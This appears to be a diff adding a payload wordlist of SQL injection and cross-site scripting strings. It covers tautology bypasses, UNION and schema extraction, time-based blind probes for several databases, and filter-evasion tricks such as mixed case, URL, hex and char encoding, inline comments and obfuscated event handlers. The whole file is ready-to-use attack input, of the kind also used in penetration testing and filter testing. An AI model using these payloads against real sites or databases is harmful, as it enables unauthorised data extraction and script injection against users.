@@ -1,0 +1,55 @@
+# ==== SQL Injection Payloads ====
+' OR '1'='1
+" Or 1=1--
+1' oR '1'='1'--
+' UnIoN SeLeCt NuLl--
+1' AnD SlEeP(5)--
+1' %55%4E%49%4F%4E %53%45%4C%45%43%54 NULL--
++AnD+(SeLeCt+5140+FrOm+(SeLeCt(SlEeP(5)))a)
+1/*!11111UNION*/SELECT/**/NULL--
+1'/*!50000AND*/SLEEP(5)--
+
+# Advanced SQLi Payloads (Added)
+1' OR CHAR(34)+CHAR(34)=CHAR(34)--  # Char-encoded empty string
+1' AND 1=1 UNION ALL SELECT NULL,TABLE_NAME FROM INFORMATION_SCHEMA.TABLES--  # Information schema extraction
+1' OR 1=1; WAITFOR DELAY '0:0:5'--  # MSSQL timing
+1' AND PG_SLEEP(5)--  # PostgreSQL timing
+1' OR DBMS_PIPE.RECEIVE_MESSAGE(CHR(99)||CHR(99),5)=1--  # Oracle timing
+1' AND (SELECT 1 FROM (SELECT SLEEP(5))x)--  # Nested sleep
+1' UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45)--  # Char-encoded output
+1' OR 1=1 AND 1=CONVERT(INT,(SELECT @@VERSION))--  # MSSQL version extraction with error
+1' OR 1=1 AND 1=CAST((CHR(113)||CHR(118)||CHR(107)||CHR(118)||CHR(113))||(SELECT (CASE WHEN (1=1) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(106)||CHR(113)||CHR(120)||CHR(113)) AS NUMERIC)--  # PostgreSQL char-obfuscated boolean test
+1' AND 1=1 UNION SELECT 0x2e2e2f,0x2e2e2f--  # Hex-obfuscated UNION
+
+# ==== Cross-Site Scripting Payloads ====
+<script>eval(atob('YWxlcnQoMSk='))</script>
+<img src="data:image/svg+xml,<svg onload=alert(1)>">
+<sCrIpT>alert(1)</sCrIpT>
+<img src=x onerror="\u0061\u006c\u0065\u0072\u0074(1)">
+<svg/onload=window["al"+"ert"]`1337`>
+<img src=x onerror=alert(1)//
+<script>/*@cc_on!@*/alert(1)</script>
+<div onpointerrawupdate=alert(1)>
+<svg/onload=prompt%26%230000000040document.domain)>
+<details/open/ontoggle=alert(1)>
+<scr<script>ipt>alert(1)</script>
+<address onscrollsnapchange=window['ev'+'a'+(['l'][0])](atob('YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=='))>
+
+# Advanced XSS Payloads (Added)
+<svg/onload=alert`1`>  # Template literal alert
+<img/src=x onerror=alert(1)//>  # Alternative slash termination
+<math href="javascript:alert(1)">click</math>  # Math tag with JS href
+<svg><animate onbegin=alert(1) attributeName=x dur=1s>  # Animate event
+<iframe src="javascript:alert(1)"></iframe>  # JS in iframe src
+<body onload=alert(1)>  # Body onload
+<video><source onerror="alert(1)">  # Video source onerror
+<style>@import'javascript:alert(1)';</style>  # CSS import JS
+<svg onload="javascript:alert(1)" xmlns="http://www.w3.org/2000/svg"></svg>  # SVG with JS onload
+<img src=x onerror=this['al'+'ert'](1)>  # Concatenated alert
+<svg><desc><![CDATA[<script>alert(1)</script>]]></desc></svg>  # CDATA obfuscation
+<svg><foreignObject><![CDATA[<script>alert(1)</script>]]></foreignObject></svg>  # ForeignObject CDATA
+<svg><script xlink:href="data:,alert(1)"></script>  # XLink href data URI
+<meta http-equiv="refresh" content="0;url=javascript:alert(1)">  # Meta refresh JS
+<svg><set onbegin="alert(1)" begin="0"></set></svg>  # Set animation event
+<div onmouseleave="alert(1)">hover out</div>  # onmouseleave event
+<svg><path id="x" d="M0 0"></path><use xlink:href="#x" onfocus="alert(1)" autofocus></use></svg>  # onfocus with autofocus
